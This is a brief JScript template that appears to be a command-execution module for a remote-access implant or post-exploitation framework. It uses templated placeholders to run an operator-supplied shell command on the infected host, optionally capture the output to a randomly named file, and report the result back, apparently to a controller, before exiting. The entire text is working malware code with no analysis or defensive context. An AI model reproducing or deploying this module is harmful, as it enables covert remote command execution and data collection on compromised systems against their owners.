try
{
    var readout = ~OUTPUT~;
    if (readout)
    {
        var output = proton.shell.exec("~FCMD~", "~FDIRECTORY~\\"+proton.uuid()+".txt");
    }
    else
    {
        var output = "";
        proton.shell.run("~FCMD~");
        proton.work.report();
    }

    if (output != "")
    {
        proton.work.report(output);
    }
}
catch (e)
{
    proton.work.error(e);
}

proton.exit();
